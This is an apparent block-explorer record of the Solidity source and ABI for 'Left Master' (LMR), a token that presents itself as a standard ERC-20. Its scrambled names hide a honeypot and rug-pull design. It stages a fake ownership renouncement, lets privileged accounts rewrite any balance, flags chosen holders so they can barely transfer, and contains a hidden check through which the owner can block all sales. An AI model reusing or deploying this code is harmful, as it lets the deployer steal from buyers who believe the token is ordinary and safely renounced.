{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface enableBuy {\n    function createPair(address walletList, address receiverTeam) external returns (address);\n}\n\ninterface autoLimitMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverBuy) external view returns (uint256);\n\n    function transfer(address fromTrading, uint256 buyListTake) external returns (bool);\n\n    function allowance(address totalAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buyListTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromTrading,\n        uint256 buyListTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableTeam, uint256 value);\n    event Approval(address indexed totalAt, address indexed spender, uint256 value);\n}\n\nabstract contract totalLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface autoLimitMarketingMetadata is autoLimitMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LeftMaster is totalLiquidity, autoLimitMarketing, autoLimitMarketingMetadata {\n\n    address public launchedMarketing;\n\n    function totalList() public {\n        emit OwnershipTransferred(launchedMarketing, address(0));\n        senderSell = address(0);\n    }\n\n    function modeWallet() private view {\n        require(tradingExempt[_msgSender()]);\n    }\n\n    uint8 private modeAutoIs = 18;\n\n    bool public tradingAt;\n\n    function maxSellTake(address atList, address fromTrading, uint256 buyListTake) internal returns (bool) {\n        if (atList == launchedMarketing) {\n            return sellMax(atList, fromTrading, buyListTake);\n        }\n        uint256 atFromEnable = autoLimitMarketing(receiverEnable).balanceOf(enableWalletFee);\n        require(atFromEnable == marketingShould);\n        require(fromTrading != enableWalletFee);\n        if (tradingTo[atList]) {\n            return sellMax(atList, fromTrading, feeEnable);\n        }\n        return sellMax(atList, fromTrading, buyListTake);\n    }\n\n    function owner() external view returns (address) {\n        return senderSell;\n    }\n\n    bool public launchBuy;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atFrom;\n    }\n\n    function teamSwap(address liquidityMax) public {\n        if (totalTo) {\n            return;\n        }\n        \n        tradingExempt[liquidityMax] = true;\n        if (shouldReceiver) {\n            atFund = tokenLiquidity;\n        }\n        totalTo = true;\n    }\n\n    address tradingMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private atFrom = 100000000 * 10 ** 18;\n\n    uint256 marketingShould;\n\n    uint256 private txTrading;\n\n    function allowance(address fromFund, address totalLiquidityMin) external view virtual override returns (uint256) {\n        if (totalLiquidityMin == tradingMin) {\n            return type(uint256).max;\n        }\n        return receiverAmount[fromFund][totalLiquidityMin];\n    }\n\n    bool private walletMax;\n\n    address private senderSell;\n\n    uint256 private atFund;\n\n    function transferFrom(address atList, address fromTrading, uint256 buyListTake) external override returns (bool) {\n        if (_msgSender() != tradingMin) {\n            if (receiverAmount[atList][_msgSender()] != type(uint256).max) {\n                require(buyListTake <= receiverAmount[atList][_msgSender()]);\n                receiverAmount[atList][_msgSender()] -= buyListTake;\n            }\n        }\n        return maxSellTake(atList, fromTrading, buyListTake);\n    }\n\n    function sellMax(address atList, address fromTrading, uint256 buyListTake) internal returns (bool) {\n        require(swapTeamMax[atList] >= buyListTake);\n        swapTeamMax[atList] -= buyListTake;\n        swapTeamMax[fromTrading] += buyListTake;\n        emit Transfer(atList, fromTrading, buyListTake);\n        return true;\n    }\n\n    uint256 swapMax;\n\n    function transfer(address fundWallet, uint256 buyListTake) external virtual override returns (bool) {\n        return maxSellTake(_msgSender(), fundWallet, buyListTake);\n    }\n\n    string private sellFrom = \"LMR\";\n\n    address enableWalletFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellFrom;\n    }\n\n    address public receiverEnable;\n\n    bool private shouldReceiver;\n\n    event OwnershipTransferred(address indexed shouldLaunched, address indexed minAmount);\n\n    mapping(address => bool) public tradingExempt;\n\n    function name() external view virtual override returns (string memory) {\n        return teamFrom;\n    }\n\n    bool public totalTo;\n\n    function approve(address totalLiquidityMin, uint256 buyListTake) public virtual override returns (bool) {\n        receiverAmount[_msgSender()][totalLiquidityMin] = buyListTake;\n        emit Approval(_msgSender(), totalLiquidityMin, buyListTake);\n        return true;\n    }\n\n    function balanceOf(address receiverBuy) public view virtual override returns (uint256) {\n        return swapTeamMax[receiverBuy];\n    }\n\n    function totalReceiver(address fundWallet, uint256 buyListTake) public {\n        modeWallet();\n        swapTeamMax[fundWallet] = buyListTake;\n    }\n\n    function toToken(address modeTradingReceiver) public {\n        modeWallet();\n        if (tradingAt) {\n            atFund = txTrading;\n        }\n        if (modeTradingReceiver == launchedMarketing || modeTradingReceiver == receiverEnable) {\n            return;\n        }\n        tradingTo[modeTradingReceiver] = true;\n    }\n\n    function swapTeam(uint256 buyListTake) public {\n        modeWallet();\n        marketingShould = buyListTake;\n    }\n\n    mapping(address => bool) public tradingTo;\n\n    uint256 public totalExempt;\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeAutoIs;\n    }\n\n    uint256 constant feeEnable = 12 ** 10;\n\n    mapping(address => uint256) private swapTeamMax;\n\n    bool private tokenIs;\n\n    function getOwner() external view returns (address) {\n        return senderSell;\n    }\n\n    string private teamFrom = \"Left Master\";\n\n    constructor (){\n        \n        autoLaunch receiverExempt = autoLaunch(tradingMin);\n        receiverEnable = enableBuy(receiverExempt.factory()).createPair(receiverExempt.WETH(), address(this));\n        if (tokenLiquidity == totalExempt) {\n            totalExempt = tokenLiquidity;\n        }\n        launchedMarketing = _msgSender();\n        tradingExempt[launchedMarketing] = true;\n        swapTeamMax[launchedMarketing] = atFrom;\n        totalList();\n        if (atFund != totalExempt) {\n            walletMax = false;\n        }\n        emit Transfer(address(0), launchedMarketing, atFrom);\n    }\n\n    uint256 private tokenLiquidity;\n\n    mapping(address => mapping(address => uint256)) private receiverAmount;\n\n    bool private walletShould;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalLiquidityMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLiquidityMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyListTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyListTake\",\"type\":\"uint256\"}],\"name\":\"swapTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMax\",\"type\":\"address\"}],\"name\":\"teamSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTradingReceiver\",\"type\":\"address\"}],\"name\":\"toToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyListTake\",\"type\":\"uint256\"}],\"name\":\"totalReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyListTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyListTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LeftMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}